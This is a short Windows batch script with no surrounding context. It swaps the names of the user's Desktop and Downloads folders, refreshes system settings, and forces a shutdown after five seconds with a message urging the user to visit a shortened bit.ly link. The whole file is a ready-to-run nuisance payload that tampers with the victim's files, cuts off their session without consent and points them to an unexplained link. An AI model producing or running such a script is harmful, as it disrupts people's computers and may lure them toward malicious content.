@echo off
set "desk=%USERPROFILE%\Desktop"
set "down=%USERPROFILE%\Downloads"
ren "%desk%" Desktop_temp
ren "%down%" Desktop
ren "%desk%_temp" Downloads
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
shutdown /s /t 5 /c "bit.ly/ggtfiles go now"
exit
